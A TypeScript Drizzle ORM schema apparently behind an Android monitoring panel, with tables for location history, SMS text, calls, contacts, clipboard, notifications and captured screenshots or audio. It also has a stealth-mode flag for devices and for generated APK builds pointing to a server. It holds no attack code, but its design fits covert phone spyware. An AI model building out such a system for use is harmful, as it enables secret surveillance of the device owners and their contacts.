import {
  integer,
  pgEnum,
  pgTable,
  text,
  timestamp,
  varchar,
  boolean,
  decimal,
  json,
  bigint,
  index,
  serial,
} from "drizzle-orm/pg-core";

// Enums
export const roleEnum = pgEnum("role", ["admin", "manager", "user", "viewer"]);
export const deviceStatusEnum = pgEnum("device_status", ["online", "offline", "inactive"]);
export const smsDirectionEnum = pgEnum("sms_direction", ["incoming", "outgoing"]);
export const callTypeEnum = pgEnum("call_type", ["incoming", "outgoing", "missed"]);
export const fileTypeEnum = pgEnum("file_type", ["screenshot", "video", "audio", "photo"]);
export const actionTypeEnum = pgEnum("action_type", [
  "user_login", "user_logout", "user_created", "user_updated", "user_deleted",
  "permission_granted", "permission_revoked", "device_added", "device_removed",
  "device_monitored", "data_accessed", "data_exported", "settings_changed", "security_event",
]);
export const auditStatusEnum = pgEnum("audit_status", ["success", "failure"]);
export const apkStatusEnum = pgEnum("apk_status", ["building", "ready", "failed", "expired"]);
export const geofenceEventTypeEnum = pgEnum("geofence_event_type", ["entry", "exit"]);
export const loginMethodEnum = pgEnum("login_method", ["local", "google"]);

/**
 * Core user table backing auth flow with role-based access control.
 */
export const users = pgTable(
  "users",
  {
    id: serial("id").primaryKey(),
    openId: varchar("openId", { length: 64 }).notNull().unique(),
    name: text("name"),
    email: varchar("email", { length: 320 }).unique(),
    loginMethod: varchar("loginMethod", { length: 64 }),
    role: roleEnum("role").default("viewer").notNull(),
    twoFactorEnabled: boolean("twoFactorEnabled").default(false).notNull(),
    twoFactorSecret: varchar("twoFactorSecret", { length: 255 }),
    passwordHash: varchar("passwordHash", { length: 255 }),
    isActive: boolean("isActive").default(true).notNull(),
    lastSignedIn: timestamp("lastSignedIn"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  }
);

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Permissions table - defines available permissions in the system.
 */
export const permissions = pgTable(
  "permissions",
  {
    id: serial("id").primaryKey(),
    code: varchar("code", { length: 64 }).notNull().unique(),
    name: varchar("name", { length: 255 }).notNull(),
    description: text("description"),
    category: varchar("category", { length: 64 }).notNull(),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
  }
);

export type Permission = typeof permissions.$inferSelect;
export type InsertPermission = typeof permissions.$inferInsert;

/**
 * User permissions junction table - maps users to permissions.
 */
export const userPermissions = pgTable(
  "userPermissions",
  {
    id: serial("id").primaryKey(),
    userId: integer("userId").notNull(),
    permissionId: integer("permissionId").notNull(),
    grantedAt: timestamp("grantedAt").defaultNow().notNull(),
    grantedBy: integer("grantedBy"),
  }
);

export type UserPermission = typeof userPermissions.$inferSelect;
export type InsertUserPermission = typeof userPermissions.$inferInsert;

/**
 * Android devices table - stores connected Android devices.
 */
export const devices = pgTable(
  "devices",
  {
    id: serial("id").primaryKey(),
    deviceId: varchar("deviceId", { length: 255 }).notNull().unique(),
    deviceName: varchar("deviceName", { length: 255 }).notNull(),
    manufacturer: varchar("manufacturer", { length: 255 }),
    model: varchar("model", { length: 255 }),
    androidVersion: varchar("androidVersion", { length: 64 }),
    imei: varchar("imei", { length: 64 }).unique(),
    phoneNumber: varchar("phoneNumber", { length: 20 }),
    ownerId: integer("ownerId").notNull(),
    status: deviceStatusEnum("status").default("offline").notNull(),
    lastSeen: timestamp("lastSeen"),
    isStealthMode: boolean("isStealthMode").default(false).notNull(),
    batteryLevel: integer("batteryLevel"),
    storageUsed: bigint("storageUsed", { mode: "number" }),
    storageTotal: bigint("storageTotal", { mode: "number" }),
    metadata: json("metadata"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  }
);

export type Device = typeof devices.$inferSelect;
export type InsertDevice = typeof devices.$inferInsert;

/**
 * Device permissions table - maps devices to users with specific permissions.
 */
export const devicePermissions = pgTable(
  "devicePermissions",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    userId: integer("userId").notNull(),
    permissionId: integer("permissionId").notNull(),
    grantedAt: timestamp("grantedAt").defaultNow().notNull(),
    grantedBy: integer("grantedBy"),
  }
);

export type DevicePermission = typeof devicePermissions.$inferSelect;
export type InsertDevicePermission = typeof devicePermissions.$inferInsert;

/**
 * Location history table - stores GPS tracking data.
 */
export const locationHistory = pgTable(
  "locationHistory",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }).notNull(),
    longitude: decimal("longitude", { precision: 11, scale: 8 }).notNull(),
    accuracy: decimal("accuracy", { precision: 10, scale: 2 }),
    altitude: decimal("altitude", { precision: 10, scale: 2 }),
    speed: decimal("speed", { precision: 10, scale: 2 }),
    bearing: decimal("bearing", { precision: 10, scale: 2 }),
    provider: varchar("provider", { length: 64 }),
    address: text("address"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type LocationHistory = typeof locationHistory.$inferSelect;
export type InsertLocationHistory = typeof locationHistory.$inferInsert;

/**
 * SMS logs table - stores SMS message history.
 */
export const smsLogs = pgTable(
  "smsLogs",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
    messageBody: text("messageBody").notNull(),
    direction: smsDirectionEnum("direction").notNull(),
    timestamp: timestamp("timestamp").notNull(),
    isRead: boolean("isRead").default(false).notNull(),
    threadId: varchar("threadId", { length: 64 }),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type SmsLog = typeof smsLogs.$inferSelect;
export type InsertSmsLog = typeof smsLogs.$inferInsert;

/**
 * Call logs table - stores call history.
 */
export const callLogs = pgTable(
  "callLogs",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
    contactName: varchar("contactName", { length: 255 }),
    callType: callTypeEnum("callType").notNull(),
    duration: integer("duration").notNull(),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type CallLog = typeof callLogs.$inferSelect;
export type InsertCallLog = typeof callLogs.$inferInsert;

/**
 * Contacts table - stores device contacts.
 */
export const contacts = pgTable(
  "contacts",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    name: varchar("name", { length: 255 }).notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }),
    email: varchar("email", { length: 320 }),
    photoUrl: text("photoUrl"),
    notes: text("notes"),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type Contact = typeof contacts.$inferSelect;
export type InsertContact = typeof contacts.$inferInsert;

/**
 * Installed applications table - stores list of apps on device.
 */
export const installedApps = pgTable(
  "installedApps",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    packageName: varchar("packageName", { length: 255 }).notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    version: varchar("version", { length: 64 }),
    versionCode: integer("versionCode"),
    isSystemApp: boolean("isSystemApp").default(false).notNull(),
    installTime: timestamp("installTime"),
    updateTime: timestamp("updateTime"),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type InstalledApp = typeof installedApps.$inferSelect;
export type InsertInstalledApp = typeof installedApps.$inferInsert;

/**
 * Clipboard logs table - stores clipboard history.
 */
export const clipboardLogs = pgTable(
  "clipboardLogs",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    content: text("content").notNull(),
    contentType: varchar("contentType", { length: 64 }),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type ClipboardLog = typeof clipboardLogs.$inferSelect;
export type InsertClipboardLog = typeof clipboardLogs.$inferInsert;

/**
 * Notifications log table - stores notification history.
 */
export const notificationLogs = pgTable(
  "notificationLogs",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    title: varchar("title", { length: 255 }),
    body: text("body"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type NotificationLog = typeof notificationLogs.$inferSelect;
export type InsertNotificationLog = typeof notificationLogs.$inferInsert;

/**
 * Media files table - stores references to captured media.
 */
export const mediaFiles = pgTable(
  "mediaFiles",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    fileType: fileTypeEnum("fileType").notNull(),
    fileName: varchar("fileName", { length: 255 }).notNull(),
    fileUrl: text("fileUrl").notNull(),
    fileSize: bigint("fileSize", { mode: "number" }),
    duration: integer("duration"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type MediaFile = typeof mediaFiles.$inferSelect;
export type InsertMediaFile = typeof mediaFiles.$inferInsert;

/**
 * Audit logs table - comprehensive logging of all system actions.
 */
export const auditLogs = pgTable(
  "auditLogs",
  {
    id: serial("id").primaryKey(),
    userId: integer("userId"),
    deviceId: integer("deviceId"),
    action: varchar("action", { length: 255 }).notNull(),
    actionType: actionTypeEnum("actionType").notNull(),
    resourceType: varchar("resourceType", { length: 64 }),
    resourceId: varchar("resourceId", { length: 255 }),
    details: json("details"),
    ipAddress: varchar("ipAddress", { length: 45 }),
    userAgent: text("userAgent"),
    status: auditStatusEnum("status").default("success").notNull(),
    timestamp: timestamp("timestamp").defaultNow().notNull(),
  }
);

export type AuditLog = typeof auditLogs.$inferSelect;
export type InsertAuditLog = typeof auditLogs.$inferInsert;

/**
 * APK builds table - stores APK generation history and configurations.
 */
export const apkBuilds = pgTable(
  "apkBuilds",
  {
    id: serial("id").primaryKey(),
    buildId: varchar("buildId", { length: 64 }).notNull().unique(),
    createdBy: integer("createdBy").notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    packageName: varchar("packageName", { length: 255 }).notNull(),
    versionName: varchar("versionName", { length: 64 }),
    versionCode: integer("versionCode"),
    iconUrl: text("iconUrl"),
    stealthMode: boolean("stealthMode").default(false).notNull(),
    ports: json("ports"),
    sslEnabled: boolean("sslEnabled").default(true).notNull(),
    serverUrl: text("serverUrl"),
    apkUrl: text("apkUrl"),
    fileSize: bigint("fileSize", { mode: "number" }),
    status: apkStatusEnum("status").default("building").notNull(),
    downloadCount: integer("downloadCount").default(0).notNull(),
    expiresAt: timestamp("expiresAt"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  }
);

export type ApkBuild = typeof apkBuilds.$inferSelect;
export type InsertApkBuild = typeof apkBuilds.$inferInsert;

/**
 * Geofences table - stores geofence definitions for location-based alerts.
 */
export const geofences = pgTable(
  "geofences",
  {
    id: serial("id").primaryKey(),
    deviceId: integer("deviceId").notNull(),
    name: varchar("name", { length: 255 }).notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }).notNull(),
    longitude: decimal("longitude", { precision: 11, scale: 8 }).notNull(),
    radius: decimal("radius", { precision: 10, scale: 2 }).notNull(),
    isActive: boolean("isActive").default(true).notNull(),
    alertOnEntry: boolean("alertOnEntry").default(true).notNull(),
    alertOnExit: boolean("alertOnExit").default(true).notNull(),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  }
);

export type Geofence = typeof geofences.$inferSelect;
export type InsertGeofence = typeof geofences.$inferInsert;

/**
 * Geofence events table - logs when devices enter/exit geofences.
 */
export const geofenceEvents = pgTable(
  "geofenceEvents",
  {
    id: serial("id").primaryKey(),
    geofenceId: integer("geofenceId").notNull(),
    deviceId: integer("deviceId").notNull(),
    eventType: geofenceEventTypeEnum("eventType").notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }),
    longitude: decimal("longitude", { precision: 11, scale: 8 }),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  }
);

export type GeofenceEvent = typeof geofenceEvents.$inferSelect;
export type InsertGeofenceEvent = typeof geofenceEvents.$inferInsert;
